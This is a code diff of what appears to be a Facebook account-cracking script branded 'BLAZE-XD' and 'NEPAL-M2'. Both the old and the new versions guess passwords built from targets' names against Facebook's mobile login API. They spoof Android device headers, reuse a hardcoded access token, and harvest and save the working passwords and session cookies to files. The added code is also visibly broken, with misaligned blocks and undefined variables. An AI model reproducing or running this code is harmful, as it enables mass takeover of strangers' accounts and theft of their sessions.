@@ -1079,7 +1079,6 @@ def method():
     linex()
     
     def method1(user):
-     try:
         try:
             global loop,oks,cps
             mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
@@ -1156,67 +1155,80 @@ def method():
 
  
     def method2(user):
-      global loop,accounts
       try:
-        r = requests.Session()
-        user = user.strip()
-        acc, name = user.split("|")
-        first = name.rsplit(" ")[0]
-        try:
-            last = name.rsplit(" ")[1]
-        except:
-            last = first
-        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
-        sys.stdout.flush()
-        for pword in totalpass:
-            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"
-            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-            pword = pword.replace("first", first).replace("last", last)
-            pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
-            if 'session_key' in response.text:
-                okacc.append(acc)
-                print('\r\033[1;92m [BLAZE-Ok] '+acc+'| '+pword+'  ')
-                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} • {pword}\n')
-                if c=='y':
-                 try:  
-                  q = json.loads(response.text)
-                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                  cookies = f"sb={ssbb};{ckkk}"
-                 except Exception as e:print(str(e)+' | '+response.text)
-                 print('\r\033[1;95m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
-                 break
-            elif 'checkpoint' in response.text:
-                if cpok=='n':
-                     pass
+                 try:
+            global loop,oks,cps
+            mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F', 'SM-T575', 'SM-A516V', 'SM-M017F', 'SM-J260GU', 'SM-J260GU', 'SM-J260FU', 'SM-J260MU', 'SM-A716F', 'SM-A716F', 'SM-A716F', 'SM-A7160', 'SM-A716B', 'SM-A716U', 'SM-A716B', 'SM-M115F', 'SM-M115F', 'SM-M115M', 'SM-M115M', 'SM-G988', 'SM-G988U', 'SM-G988U1', 'SM-G9880', 'SM-G988B', 'SM-G988N', 'SM-G988B', 'SM-T927A', 'SM-T920', 'SM-A305F', 'SM-A305FN', 'SM-A305G', 'SM-A305GN', 'SM-A305YN', 'SM-A3050', 'SM-A305N', 'SM-A305GT', 'SM-A105F', 'SM-A105G', 'SM-A105M', 'SM-A105FN', 'SM-A920F', 'SM-A9200', 'SM-A920N', 'SM-A920X', 'SM-N960F', 'SM-N9600', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960N', 'SM-N960W', 'SM-N960X', 'SCV40'])
+            uai = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(40,200))+'.0.0.'+str(random.randint(1,66))+'.117;FBBV/308613358;FBDM/{density=2.0,width=720,height=1440};FBLC/it_IT;FBRV/'+str(random.randint(111111111,666666666))+';FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(mcc)+';FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+            cn = random.randint(60,99)
+            sys.stdout.write(f"\r\033[1;32m[\033[1;31mNEPAL-M2\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())               
+                with requests.Session() as session:
+                    data = {
+                    "adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": sid,
+                    "password": ps,
+                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Host": "graph.facebook.com",
+                    "User-Agent": machikney(),
+                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                    "X-FB-Connection-Type": "MOBILE.LTE",
+                    "X-Tigon-Is-Retry": "False",
+                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
+                    "x-fb-device-group": "5120",
+                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
+                    "X-FB-Request-Analytics-Tags": "graphservice",
+                    "Accept-Encoding": "gzip, deflate",
+                    "X-FB-HTTP-Engine": "Liger",
+                    "X-FB-Client-IP": "True",
+                    "X-FB-Server-Cluster": "True",
+                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+                    "Connection": "Keep-Alive",
+                    "Content-Length":f"6{cn}"}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NEPALb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NEPALb};{ckkk}"
+                    print(f"\r\r{G1}[NEPAL-OK] {sid} | {ps} ")
+                    print(f"\r\r{G1}[COOKIES-💜]>{O}{cookie} ")
+                    open('/sdcard/NEPAL-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    oks.append(sid)
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    print(f"\r\r{M}[NEPAL-CP] {sid} | {ps} ")
+                    open('/sdcard/NEPAL-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                    cps.append(sid)
                 else:
-                     print('\r\033[1;97m [BLAZE-CP] '+acc+'| '+pword)
-                cpacc.append(acc)
-                open('/sdcard/BLAZE-CP.txt','a').write(f'{acc} • {pword}\n')
-                break
-            else:
-                continue
-        loop += 1    
-      except Exception as e: time.sleep(10)
-
-    if m=='2':
-        with speed(max_workers=30) as speede:
-             speede.map(method2, accounts)
-    elif m=='1':
-       with speed(max_workers=30) as speede:
-            speede.map(method1, accounts)
-    else:
-       with speed(max_workers=30) as speede:
-            speede.map(method1, accounts)
-    exit()  
-      
-
-
-
-####
+                    continue
+            loop+=1
+         
+    
     
   
     
